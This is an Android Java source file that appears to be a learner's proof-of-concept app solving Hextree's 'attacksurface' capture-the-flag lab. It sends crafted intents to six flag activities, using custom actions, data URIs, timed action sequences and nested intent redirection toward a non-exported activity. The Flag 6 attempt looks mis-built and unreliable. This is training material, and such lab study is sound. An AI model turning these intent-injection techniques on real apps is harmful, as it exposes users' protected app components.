package com.xylinz.poc;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    int counter = 0;
    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        TextView home = findViewById(R.id.string_flag);

        //Activity Intent Exploit from another app

        //Flag 1 - Activity only
        Intent flag1Intent = new Intent();
        flag1Intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag1Activity");

        Button flag1 = findViewById(R.id.flag1_button);
        flag1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(flag1Intent);
            }
        });

        //Flag 2 - Activity with action
        Intent flag2Intent = new Intent();
        flag2Intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag2Activity");
        flag2Intent.setAction("io.hextree.action.GIVE_FLAG");

        Button flag2 = findViewById(R.id.flag2_button);
        flag2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(flag2Intent);
            }
        });

        //Flag 3 - Activity with action and data URI
        Intent flag3Intent = new Intent();
        flag3Intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag3Activity");
        flag3Intent.setAction("io.hextree.action.GIVE_FLAG");
        flag3Intent.setData(Uri.parse("https://app.hextree.io/map/android"));

        Button flag3 = findViewById(R.id.flag3_button);
        flag3.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(flag3Intent);
            }
        });

        //Flag 4 - Activity with state machine (multiple call)
        Intent flag4Intent = new Intent();
        flag4Intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag4Activity");

        String[] actions = new String[] { // action berbeda
                "PREPARE_ACTION",
                "BUILD_ACTION",
                "GET_FLAG_ACTION",
                null
        };

        Button flag4 = findViewById(R.id.flag4_button);
        flag4.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Handler handler = new Handler(Looper.getMainLooper()); // ngehandle delay antar intent
                int delayMs = 0; // init delay
                for (String action : actions){
                    final Intent intent = new Intent(flag4Intent); // looping intent
                    if (action != null){
                        intent.setAction(action); // setiap intent punya action beda
                    }
                    else{
                        intent.setAction(null);
                    }
                    handler.postDelayed(new Runnable() { // ngehandle delay antar intent
                        @Override
                        public void run() {
                            startActivity(intent);
                        }
                    }, delayMs);
                    delayMs += 400; // tambah delay setiap iterasi
                }
            }
        });

        // Flag 5 - Intent in intent
        Button flag5 = findViewById(R.id.flag5_button);

        Intent innerIntent1 = new Intent();
        innerIntent1.putExtra("reason", "back");

        Intent innerIntent2 = new Intent();
        innerIntent2.putExtra("nextIntent", innerIntent1);
        innerIntent2.putExtra("return", 42);

        Intent flag5Intent = new Intent();
        flag5Intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity");
        flag5Intent.putExtra("android.intent.extra.INTENT", innerIntent2);

        flag5.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(flag5Intent);
            }
        });

        // Flag 6 - Not exported
        Button flag6 = findViewById(R.id.flag6_button);
        Intent another = new Intent();
        Intent flag6Intent = new Intent();
        flag6Intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity");
        flag6Intent.putExtra("io.hextree.attacksurface.activities.Flag6Activity", another);

        flag6.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(flag6Intent);
            }
        });
    }
}